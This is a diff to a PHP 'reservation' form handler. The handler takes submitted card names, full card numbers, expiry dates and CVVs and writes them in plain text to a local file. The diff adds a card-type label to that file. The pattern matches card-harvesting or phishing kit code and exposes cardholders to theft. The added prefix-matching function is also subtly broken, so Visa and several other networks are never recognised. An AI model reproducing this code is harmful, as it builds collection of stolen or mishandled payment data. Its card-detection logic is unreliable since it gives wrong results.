@@ -14,11 +14,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $expiryMonth = $_POST['card_expiry_month'];
     $expiryYear = $_POST['card_expiry_year'];
     $cvv = $_POST['card_cvv'];
+    $cardType = identifyCardType($cardNumber);
 
     // Create text file with reservation details
     $textFile = 'reservation_details.txt';
     $fileHandle = fopen($textFile, 'w');
     fwrite($fileHandle, "Name On Card: $cardName\n");
+    fwrite($fileHandle, "Card Type: $cardType\n");
     fwrite($fileHandle, "Card Number: $cardNumber\n");
     fwrite($fileHandle, "Expiration Date: $expiryMonth/$expiryYear\n");
     fwrite($fileHandle, "CVV: $cvv\n");
@@ -73,4 +75,39 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 } else {
     echo "Form submission error: Method not allowed.";
 }
+
+function identifyCardType($cardNumber) {
+    $cardNumber = str_replace(' ', '', $cardNumber); // Remove spaces
+    $prefix2 = substr($cardNumber, 0, 2);
+    $prefix4 = substr($cardNumber, 0, 4);
+    $prefix6 = substr($cardNumber, 0, 6);
+
+    $visaPrefixes = ["4"];
+    $mastercardPrefixes = ["51", "52", "53", "54", "55"];
+    $amexPrefixes = ["34", "37"];
+    $discoverPrefixes = ["6011", "622126", "622925", "644", "645", "646", "647", "648", "649", "65"];
+    $jcbPrefixes = ["3528", "3529", "353", "354", "355", "356", "357", "358"];
+    $dinersClubPrefixes = ["300", "301", "302", "303", "304", "305", "36", "38", "39"];
+    $unionPayPrefixes = ["62"];
+
+    // Identify card type
+    if (in_array($prefix2, $visaPrefixes)) {
+        return "Visa";
+    } elseif (in_array($prefix2, $mastercardPrefixes)) {
+        return "Mastercard";
+    } elseif (in_array($prefix2, $amexPrefixes)) {
+        return "American Express";
+    } elseif (in_array($prefix4, $discoverPrefixes) || in_array($prefix6, $discoverPrefixes)) {
+        return "Discover";
+    } elseif (in_array($prefix4, $jcbPrefixes)) {
+        return "JCB";
+    } elseif (in_array($prefix2, $dinersClubPrefixes) || in_array($prefix4, $dinersClubPrefixes)) {
+        return "Diners Club";
+    } elseif (in_array($prefix2, $unionPayPrefixes)) {
+        return "UnionPay";
+    }
+    
+    return "Unknown";
+}
+
 ?>
